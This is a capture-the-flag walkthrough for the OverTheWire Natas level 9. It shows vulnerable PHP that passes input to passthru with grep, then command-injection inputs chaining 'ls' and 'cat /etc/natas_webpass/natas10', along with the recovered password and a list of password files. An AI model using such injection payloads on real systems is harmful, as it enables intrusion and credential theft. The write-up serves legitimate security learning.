# Level 8-9

LINK : http://natas9.natas.labs.overthewire.org

Source Code :

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

So it returns different words present in dictionary.txt. 

Reads :

- http://php.net/manual/en/function.passthru.php

Let's try ls

- vedant dictionary.txt; ls; grep -i vedant dictionary.txt

Since in the beginning it is written

```html
All passwords are also stored in /etc/natas_webpass/
```

Let's try cat 

```html
- vedant dictionary.txt; cat /etc/natas_webpass/natas10; grep -i vedant dictionary.txt
```

which returns

```html
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```



- Let's  go deeper and try to fetch all password, 
  BANG !!!

  ```bash
  Output:
  natas0
  natas1
  natas10
  natas11
  natas12
  natas13
  natas14
  natas15
  natas16
  natas17
  natas18
  natas19
  natas2
  natas20
  natas21
  natas22
  natas23
  natas24
  natas25
  natas26
  natas27
  natas28
  natas29
  natas3
  natas30
  natas31
  natas32
  natas33
  natas34
  natas4
  natas5
  natas6
  natas7
  natas8
  natas9
  
  ```


  But that's no fun. Let's tackle each.​	